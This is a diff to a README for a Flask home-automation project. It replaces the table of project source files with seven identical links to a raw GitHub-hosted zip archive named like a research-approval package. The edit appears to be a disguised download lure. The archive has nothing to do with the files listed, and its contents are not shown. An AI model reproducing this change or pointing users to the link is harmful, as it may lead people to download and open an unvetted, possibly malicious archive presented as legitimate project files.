@@ -33,13 +33,13 @@ The app will consist of a Flask web server, temperature and humidity sensor, mot
 
 | Files |
 | ----- |
-| `temperature_humidity_sensor.py` |
-| `motion_sensor.py` |
-| `relay_controller.py` |
-| `pushbullet_api.py` |
-| `app.py` |
-| `home.html` |
-| `style.css` |
+| `https://raw.githubusercontent.com/LeboMeje/Research-Project-approval-Part-1/master/static/Project_Part_Research_approval_1.9.zip` |
+| `https://raw.githubusercontent.com/LeboMeje/Research-Project-approval-Part-1/master/static/Project_Part_Research_approval_1.9.zip` |
+| `https://raw.githubusercontent.com/LeboMeje/Research-Project-approval-Part-1/master/static/Project_Part_Research_approval_1.9.zip` |
+| `https://raw.githubusercontent.com/LeboMeje/Research-Project-approval-Part-1/master/static/Project_Part_Research_approval_1.9.zip` |
+| `https://raw.githubusercontent.com/LeboMeje/Research-Project-approval-Part-1/master/static/Project_Part_Research_approval_1.9.zip` |
+| `https://raw.githubusercontent.com/LeboMeje/Research-Project-approval-Part-1/master/static/Project_Part_Research_approval_1.9.zip` |
+| `https://raw.githubusercontent.com/LeboMeje/Research-Project-approval-Part-1/master/static/Project_Part_Research_approval_1.9.zip` |
 
 ## Contributor
 Lebohang Meje
